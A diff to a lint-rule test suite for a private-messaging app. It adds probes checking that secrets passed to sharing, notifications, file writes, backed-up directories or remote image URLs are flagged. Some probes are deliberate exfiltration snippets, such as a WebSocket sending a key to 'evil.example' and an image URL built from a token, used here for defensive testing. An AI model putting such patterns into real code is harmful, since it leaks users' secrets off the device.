@@ -31,6 +31,8 @@ type Probe = {
   expect: string[];
   /** Virtual location, relative to the package root; decides which config blocks apply. */
   at?: { core: string; mobile: string };
+  /** JSX probes: the core has no .tsx sources, so only the app config is asked. */
+  mobileOnly?: boolean;
 };
 
 const RN = { core: 'src/adapters/rn/__probe__/p.ts', mobile: 'app/__probe__/p.tsx' };
@@ -63,6 +65,25 @@ const probes: Probe[] = [
   { name: 'alert-member', code: `declare const Alert: any; export function f(m: { nick: string }) { Alert.alert(m.nick); }`, expect: ['sink that leaves the phone'] },
   { name: 'websocket-ident', code: `export function f(token: string) { return new WebSocket(token); }`, expect: ['sink that leaves the phone'], at: RN },
   { name: 'websocket-template', code: 'export function f(key: string) { return new WebSocket(`wss://evil.example/?k=${key}`); }', expect: ['sink that leaves the phone'], at: RN },
+  // W3-3 sinks: expo-sharing, local notifications (nested content), the media library, file writes,
+  // the backed-up Documents directory and a remote image URL built from a secret.
+  { name: 'sharing-ident', code: `declare const Sharing: any; export async function f(fileName: string) { await Sharing.shareAsync(fileName); }`, expect: ['sink that leaves the phone'] },
+  { name: 'sharing-member', code: `declare const Sharing: any; export async function f(m: { plaintext: string }) { await Sharing.shareAsync(m.plaintext, { mimeType: 'text/plain' }); }`, expect: ['sink that leaves the phone'] },
+  { name: 'notification-body-ident', code: `declare const Notifications: any; export async function f(body: string) { await Notifications.scheduleNotificationAsync({ content: { title: 'OnePeek', body }, trigger: null }); }`, expect: ['sink that leaves the phone', 'must be a string literal'] },
+  { name: 'notification-title-member', code: `declare const Notifications: any; export async function f(m: { nick: string }) { await Notifications.scheduleNotificationAsync({ content: { title: m.nick, body: 'New message' }, trigger: null }); }`, expect: ['sink that leaves the phone', 'must be a string literal'] },
+  { name: 'notification-body-template', code: 'declare const Notifications: any; export async function f(nick: string) { await Notifications.presentNotificationAsync({ content: { title: "OnePeek", body: `${nick} sent you a message` } }); }', expect: ['sink that leaves the phone', 'must be a string literal'] },
+  // A neutral name slips the name-based rule, but the literal rule still refuses it on the lock screen.
+  { name: 'notification-body-neutral', code: `declare const Notifications: any; export async function f(text: string) { await Notifications.scheduleNotificationAsync({ content: { title: 'OnePeek', body: text }, trigger: null }); }`, expect: ['must be a string literal'] },
+  { name: 'medialibrary-ident', code: `declare const MediaLibrary: any; export async function f(fileName: string) { await MediaLibrary.saveToLibraryAsync(fileName); }`, expect: ['sink that leaves the phone'] },
+  { name: 'medialibrary-member', code: `declare const MediaLibrary: any; export async function f(m: { name: string }) { await MediaLibrary.createAssetAsync(m.name); }`, expect: ['sink that leaves the phone'] },
+  { name: 'file-write-ident', code: `declare const File: any; declare const Paths: any; export function f(plaintext: Uint8Array) { new File(Paths.cache, 'x.bin').write(plaintext); }`, expect: ['sink that leaves the phone'] },
+  { name: 'file-write-member', code: `declare const File: any; declare const Paths: any; export function f(m: { body: string }) { const t = new File(Paths.cache, 'x.txt'); t.write(m.body); }`, expect: ['sink that leaves the phone'] },
+  { name: 'filesystem-write-ident', code: `declare const FileSystem: any; export async function f(uri: string, body: string) { await FileSystem.writeAsStringAsync(uri, body); }`, expect: ['sink that leaves the phone'] },
+  { name: 'paths-document', code: `declare const File: any; declare const Paths: any; export function f(bytes: Uint8Array) { new File(Paths.document, 'x.bin').write(bytes); }`, expect: ['backed up off the phone'] },
+  { name: 'filesystem-document-dir', code: `declare const FileSystem: any; export const dir = FileSystem.documentDirectory;`, expect: ['backed up off the phone'] },
+  { name: 'image-uri-template', code: 'declare const Image: any; export function V(token: string) { return <Image source={{ uri: `https://img.example/${token}` }} />; }', expect: ['remote image URL'], at: RN, mobileOnly: true },
+  { name: 'image-uri-member', code: 'declare const Image: any; export function V(m: { key: string }) { return <Image source={{ uri: m.key }} />; }', expect: ['remote image URL'], at: RN, mobileOnly: true },
+  { name: 'image-uri-ident', code: 'declare const ImageBackground: any; export function V(secret: string) { return <ImageBackground source={{ uri: secret }} />; }', expect: ['remote image URL'], at: RN, mobileOnly: true },
   { name: 'logger-member', code: `declare const logger: any; export function f(body: string) { logger.info(body); }`, expect: ['Ad-hoc logger'] },
   { name: 'log-member', code: `declare const log: any; export function f(key: string) { log.warn(key); }`, expect: ['Ad-hoc logger'] },
   { name: 'stringify-ident-to-sink', code: `declare const analytics: any; export function f(nick: string) { analytics.track(JSON.stringify(nick)); }`, expect: ['No crash reporting', 'JSON.stringify of a sensitive value'] },
@@ -109,6 +130,21 @@ export async function invite(link: string, url: string, redirect: string) {
   await WebBrowser.openAuthSessionAsync(\`\${url}?x=1\`, redirect);
   Alert.alert('Notifications are off', 'Turn them on in the phone settings.');
 }
+// W3-3: what lib/files.ts (shareBytes, writeTemp), a fixed local notification and a Photos save of a
+// decrypted temp file look like. Neutral names, literal lock-screen copy, the cache directory.
+declare const Sharing: { shareAsync(u: string, o?: { mimeType?: string }): Promise<void> };
+declare const Notifications: { scheduleNotificationAsync(r: { content: { title: string; body: string; data?: object }; trigger: null }): Promise<string> };
+declare const MediaLibrary: { saveToLibraryAsync(u: string): Promise<void> };
+declare const Paths: { cache: object };
+declare class File { constructor(d: object, n: string); write(b: Uint8Array): void; uri: string }
+export async function files(bytes: Uint8Array, mime: string, roomId: string) {
+  const f = new File(Paths.cache, 'onepeek-view/x.bin');
+  f.write(bytes);
+  const uri = f.uri;
+  await Sharing.shareAsync(uri, { mimeType: mime });
+  await MediaLibrary.saveToLibraryAsync(uri);
+  await Notifications.scheduleNotificationAsync({ content: { title: 'OnePeek', body: 'You have a new message in a private chat.', data: { roomId } }, trigger: null });
+}
 `;
 
 function fragmentsOf(messages: Linter.LintMessage[]): string[] {
@@ -128,7 +164,7 @@ function assertReported(all: Linter.LintMessage[], wanted: string[], label: stri
   // Only leak-guard reports are expected; anything else (an unused var, a parse problem) is a
   // broken probe and would hide a missing rule. The one tolerated extra is the Expo config's
   // `import/no-unresolved` on a telemetry package: it is not installed, which is the point.
-  const unexpected = got.filter(g => !/console statement|No crash reporting|Ad-hoc logger|JSON.stringify of a sensitive value|sink that leaves the phone|fetch\(\) with a literal URL|Unable to resolve path to module/.test(g));
+  const unexpected = got.filter(g => !/console statement|No crash reporting|Ad-hoc logger|JSON.stringify of a sensitive value|sink that leaves the phone|must be a string literal|backed up off the phone|remote image URL|fetch\(\) with a literal URL|Unable to resolve path to module/.test(g));
   expect(unexpected, `${label}: unexpected reports`).toEqual([]);
 }
 
@@ -148,12 +184,15 @@ afterAll(() => {
 describe('leak guard: lint rules', () => {
   for (const p of probes) {
     const at = p.at ?? CHAT;
-    it(`core config reports ${p.name}`, async () => {
-      const file = path.join(TMP, `${p.name}.core.ts`);
-      writeFileSync(file, p.code);
-      const [r] = await core.lintText(readFileSync(file, 'utf8'), { filePath: path.join(CORE, at.core) });
-      assertReported(r.messages, p.expect, `core/${p.name}`);
-    });
+    // JSX probes are not registered for the core at all (not skipped: the core has no .tsx sources).
+    if (!p.mobileOnly) {
+      it(`core config reports ${p.name}`, async () => {
+        const file = path.join(TMP, `${p.name}.core.ts`);
+        writeFileSync(file, p.code);
+        const [r] = await core.lintText(readFileSync(file, 'utf8'), { filePath: path.join(CORE, at.core) });
+        assertReported(r.messages, p.expect, `core/${p.name}`);
+      });
+    }
     it(`mobile config reports ${p.name}`, async () => {
       const file = path.join(TMP, `${p.name}.mobile.tsx`);
       writeFileSync(file, p.code);
@@ -178,7 +217,13 @@ describe('leak guard: lint rules', () => {
   });
 
   it('the off-device sink rule is about the argument, not the call: a non-secret name passes', async () => {
-    const code = `declare const Linking: any; declare const Alert: any; export async function f(roomId: string, href: string) { await Linking.openURL(href); Alert.alert('Chat ' + roomId); return new WebSocket(href); }`;
+    const code = `declare const Linking: any; declare const Alert: any; declare const Sharing: any; declare const MediaLibrary: any; declare const Paths: any; declare const File: any;
+export async function f(roomId: string, href: string, uri: string, bytes: Uint8Array) {
+  await Linking.openURL(href); Alert.alert('Chat ' + roomId);
+  await Sharing.shareAsync(uri, { mimeType: 'image/png' }); await MediaLibrary.saveToLibraryAsync(uri);
+  new File(Paths.cache, 'onepeek-view/a.bin').write(bytes);
+  return new WebSocket(href);
+}`;
     const [c] = await core.lintText(code, { filePath: path.join(CORE, RN.core) });
     expect(fragmentsOf(c.messages.filter(m => m.severity === 2)), 'core').toEqual([]);
     const [m] = await mobile.lintText(code, { filePath: path.join(MOBILE, RN.mobile) });
